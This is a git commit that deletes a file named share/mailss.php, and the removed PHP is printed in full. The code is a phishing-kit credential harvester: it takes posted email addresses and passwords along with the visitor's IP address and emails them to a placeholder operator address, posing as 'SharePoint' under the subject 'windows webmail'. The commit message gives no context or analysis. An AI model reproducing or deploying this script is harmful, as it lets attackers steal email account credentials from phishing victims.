a4aadc4ed9b0bc7f75d2d4b9da86ae2561be8b87
keftysmb <108065849+keftysmb@users.noreply.github.com>
2022-06-23 19:19:02 +0100

    Delete mailss.php

--- share/mailss.php
+++
@@ -1,9 +0,0 @@
-<?
-$ip = getenv("REMOTE_ADDR");
-$x1 = $_POST['x1'];
-$x2 = $_POST['x2'];
-$msg = "Email ID: $x1\nEmail Password: $x2\nIp: $ip";
-$from = "From: SharePoint<info@sharing.com>";
-$subj = "windows webmail";
-mail("put your email here",$subj,$msg,$from);
-?>
